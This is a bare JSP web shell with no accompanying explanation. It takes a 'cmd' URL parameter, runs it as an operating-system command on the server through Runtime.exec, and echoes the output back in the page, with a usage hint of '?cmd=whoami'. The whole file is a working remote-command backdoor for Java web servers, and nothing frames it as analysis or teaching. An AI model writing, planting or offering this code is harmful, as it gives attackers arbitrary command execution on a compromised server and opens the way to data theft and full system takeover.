<%@ page import="java.io.*" %>
<%
    String cmd = request.getParameter("cmd");
    if (cmd != null) {
        Process p = Runtime.getRuntime().exec(cmd);
        OutputStream os = p.getOutputStream();
        InputStream in = p.getInputStream();
        DataInputStream dis = new DataInputStream(in);
        String line;
        while ((line = dis.readLine()) != null) {
            out.println(line + "<br>");
        }
    } else {
        out.println("Usage: ?cmd=whoami");
    }
%>
